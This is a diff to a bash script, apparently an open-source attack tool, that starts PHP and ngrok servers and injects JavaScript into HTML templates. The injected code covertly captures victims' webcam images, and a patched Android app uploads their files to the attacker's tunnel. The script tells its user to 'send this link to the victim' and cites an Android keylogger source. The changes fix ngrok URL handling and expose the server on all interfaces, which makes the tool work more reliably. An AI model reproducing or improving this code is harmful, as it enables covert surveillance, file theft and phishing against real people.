@@ -3,7 +3,7 @@
 #####################################################
 # Coded by Kp300
 # Github: https://github.com/kp300
-# Youtube: https://www.youtube.com/channel/UCmTe8G5kk_0UvV2OkxrQJrQ
+# Facebook: www.fb.me/KaliTutorialOfficial
 # Source android Keylogger: https://github.com/IceWreck/LokiBoard-Android-Keylogger
 # Idea from thelinuxchoice
 ####################################################
@@ -24,6 +24,8 @@ readonly var1="<script type="text/javascript" src="https://wybiral.github.io/cod
 readonly var2="<script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>"
 readonly requirements=("curl" "php" "xterm" "ngrok" "zenity")
 readonly pathsdk=1
+
+#############
 
 ## pressed Ctrl+C
 ctrl_c() {
@@ -122,13 +124,14 @@ echo '                   }' >> $getfiles_source
 echo '               }' >> $getfiles_source
 }
 jsscript() {
+  link_ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
 ############## < check & replace ngrok server > ##############
 if grep -s -q link_server JS/scripts.js; then
-  sed -i "s+link_server+$link_ngrok+g" JS/scripts.js > /dev/null 2>&1
-elif grep -s -q https://[0-9a-z]*\.ngrok.io JS/scripts.js; then
-  sed -i "s+https://[0-9a-z]*\.ngrok.io+$link_ngrok+gI" JS/scripts.js > /dev/null 2>&1
+  sed -i "s+link_server+https://$link_ngrok+g" JS/scripts.js > /dev/null 2>&1
+elif grep -s -q https://.*.ngrok.io JS/scripts.js; then
+  sed -i "s+https://.*.ngrok.io+https://$link_ngrok+gI" JS/scripts.js > /dev/null 2>&1
 else
-  sed -i "/saved.php/d" JS/scripts.js > /dev/null 2>&1; sed -i "/data: { cat: imgdata},/a\     url: '$link_ngrok/saved.php'," JS/scripts.js > /dev/null 2>&1
+  sed -i "/saved.php/d" JS/scripts.js > /dev/null 2>&1; sed -i "/data: { cat: imgdata},/a\     url: 'https://$link_ngrok/saved.php'," JS/scripts.js > /dev/null 2>&1
 fi
 
 }
@@ -136,13 +139,13 @@ php_index() {
 ## add php scripts
 echo "<?php" > index.php
 echo "include 'ip.php';" >> index.php
-echo "header('Location: $link_ngrok/index.html');" >> index.php
+echo "header('Location: https://$link_ngrok/index.html');" >> index.php
 echo "exit" >> index.php
 echo "?>" >> index.php
 }
 
 function depentacies() {
-  clear;printf "\e[0m\e[1;77mCheck depentacies ..................................\e[0m\n\n"
+clear;printf "\e[0m\e[1;77mCheck depentacies ..................................\e[0m\n\n"
 for checkrequirements in ${requirements[@]}; do
   if [[ $(which $checkrequirements) != "" ]]; then
     printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\t\e[0m\e[38;5;51m %s\e[0m\n" $checkrequirements;sleep .10
@@ -178,14 +181,14 @@ function ngrok_start() {
       printf "\n\e[0mTCP tunnels are only available after you sign up.\nSign up at: https://ngrok.com/signup\n\nIf you have already signed up, make sure your authtoken is installed.\nYour authtoken is available on your dashboard: https://dashboard.ngrok.com/auth/your-authtoken\n\nERR_NGROK_302";
       ctrl_c;
     fi
-    
+
   elif [[ $code -eq 3 ]]; then
     pkill -f ngrok
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Starting Ngrok..\n"
     xterm -T " Starting Ngrok " -geometry 100x25-1+0 -e "ngrok http 4444" & > /dev/null 2>&1
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Please wait..\n"
     sleep 10;
-    link_ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
+    link_ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
   fi
 
 }
@@ -204,7 +207,7 @@ function php_start() {
     ############## < start php take webcam > ##############
     pkill -f php
     cp -rf PHP/ip.php PHP/saved.php .;
-    xterm -T " Starting php " -geometry 100x25+1+0 -e "php -S 127.0.0.1:4444" & > /dev/null 2>&1
+    xterm -T " Starting php " -geometry 100x25+1+0 -e "php -S 0.0.0.0:4444" & > /dev/null 2>&1
     printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]\e[0m\e[38;5;154m Starting php server...\n"
     sleep 2
   else
@@ -226,11 +229,12 @@ if [[ $code -eq 1 ]]; then
   	done
   elif [[ $host -eq 2 ]] || [[ $host -eq 02 ]]; then
     ngrok_start
-    link_ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "https://[0-9a-z]*\.ngrok.io")
-    sed -i "/String pathToOurFile = selectedPath;/a\        String urlServer = \"$link_ngrok/upload.php\";" $getfiles_source
-  	if ! grep -s -q https://[0-9a-z]*\.ngrok.io $getfiles_source; then
-  		printf "\n\e[0m\e[38;5;9mCan't find ngrok link in the script!"; pkill -f ngrok; ctrl_c;
-  	fi
+    link_ngrok=$(curl -s -N http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p')
+    if [[ $link_ngrok != "" ]]; then
+      sed -i "/String pathToOurFile = selectedPath;/a\        String urlServer = \"https://$link_ngrok/upload.php\";" $getfiles_source
+    else
+      printf "\n\e[0m\e[38;5;9mCan't find ngrok link in the script!"; pkill -f ngrok; ctrl_c;
+    fi
   else
     ctrl_c;
   fi
@@ -378,7 +382,7 @@ fi
 function take_webcam_main() {
 
 php_start
-printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Send this link to the victim:\e[0m\e[1;77m %s\e[0m\n" $link_ngrok
+printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[38;5;154m Send this link to the victim:\e[0m\e[1;77m https://%s\e[0m\n" $link_ngrok
 printf "\n\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[1;77m\e[38;5;154m Waiting targets,\e[0m\e[1;77m Press Ctrl + C to exit...\e[0m\n"
 if [[ ! -d webcam ]]; then
   mkdir webcam
@@ -403,14 +407,14 @@ done
 
 }
 function take_webcam_default() {
-
+#link_ngrok=curl -s -N http://127.0.0.1:4040/api/tunnels | sed -nE 's/.*public_url":"https:..([^"]*).*/\1/p'
 if [[ -f PHP/index.html ]]; then
   if grep -s -q ngrok.io PHP/index.html; then
-    sed -i "s+https://[0-9a-z]*\.ngrok.io+$link_ngrok+gI" PHP/index.html
+    sed -i "s+https://.*.ngrok.io+https://$link_ngrok+gI" PHP/index.html
   elif grep -s -q link_server PHP/index.html; then
-    sed -i 's+link_server+'$link_ngrok'+g' PHP/index.html
+    sed -i 's+link_server+'https://$link_ngrok'+g' PHP/index.html
   elif grep -s -q saved.php PHP/index.html; then
-    sed -i "/saved.php/d" PHP/index.html;sed -i "/data: { cat: imgdata},/a\     url: '$link_ngrok/saved.php'," PHP/index.html;
+    sed -i "/saved.php/d" PHP/index.html;sed -i "/data: { cat: imgdata},/a\     url: 'https://$link_ngrok/saved.php'," PHP/index.html;
   fi
 else
   printf "\e[0m\e[38;5;9m index.html is not found in directory PHP/index.html. Aborting!"; exit 1;
@@ -440,7 +444,7 @@ ngrok_start
 jsscript
 php_index
 sed -i "\|</head>|r JS/scripts.js" index/$(basename -s .html "$find_html".html); sed -i "/header/d" index.php > /dev/null 2>&1
-sed -i "/'ip.php';/a\header('Location: $link_ngrok/index/$(basename -s .html "$find_html".html)');" index.php > /dev/null 2>&1
+sed -i "/'ip.php';/a\header('Location: https://$link_ngrok/index/$(basename -s .html "$find_html".html)');" index.php > /dev/null 2>&1
 take_webcam_main
 }
 function take_webcam() {
@@ -458,7 +462,7 @@ while [[ $custom_template != "" ]]; do
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77m Choose number 0/1/2 or (\e[1;77m\e[38;5;154mHit Enter to Default\e[0m): \e[0m' custom_template
 case $custom_template in
   1|01) printf "\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m] Custom HTML\e[0m\n";
-        html=$(zenity --file-filter="*.html" --title="Choose html" --file-selection --filename="/home/"$user"/")
+        html=$(zenity --file-filter="*.html" --file-selection --title="Choose html" --filename="/home/"$user"/")
         if [ ! -z "$html" ]; then
           if [[ -f JS/scripts.js ]]; then
             ngrok_start
@@ -468,6 +472,8 @@ case $custom_template in
               if grep -s -q '<head>' "$html" && grep -q '</head>' "$html"; then
                 sed -E "\|</head>|r JS/scripts.js" "$html" > PHP/index2.html; sed -i "/<head>/a\ $var1 \n $var2" PHP/index2.html > /dev/null 2>&1;
                 php_index; mv PHP/index2.html ./index.html; take_webcam_main
+              else
+                printf "\e[38;5;160m[!]\e[0m\e[38;5;160m HTML cannot be injected!\n"; ctrl_c;
               fi
           else
             ctrl_c
@@ -514,11 +520,6 @@ printf "\e[1;92m[\e[0m\e[1;77m03\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Take Fa
 printf "\e[1;92m[\e[0m\e[1;77m99\e[0m\e[1;92m]\e[0m\e[1;93m\e[0m\e[1;93m Quit\e[0m\e[38;5;51m\t\t{\e[38;5;154mExit\e[38;5;51m}\e[0m\e[0m\n\n"
 read -p $'\e[1;92m[\e[0m\e[1;77m+\e[0m\e[1;92m]\e[0m\e[1;77m Choose a number 1/2/3\e[0m: ' choose_number
 
-############< Check Internet Connection >############
-if [[ $(ping -c 1 -q google.com >&/dev/null; echo $?) != 0 ]]; then
-  printf "\e[38;5;160mno internet connection!\n"; exit 1;
-fi
-
 case $choose_number in
   1|01 )
     read -p $'\e[1;92m[\e[0m\e[1;77m?\e[0m\e[1;92m]\e[0m\e[1;77m Do you want to hide apps? [y/n]: ' hideApps
@@ -537,6 +538,9 @@ case $choose_number in
   *    ) printf "\e[38;5;160mInvalid!\e[0m\n"; sleep .50; clear; menu;;
 esac
 }
+if [[ $(ping -c 1 -q google.com >&/dev/null; echo $?) != 0 ]]; then
+  printf "\e[38;5;160mno internet connection!\nRun this script need connection..\n"; exit 1;
+fi
 trap ctrl_c INT
 depentacies;
 menu;
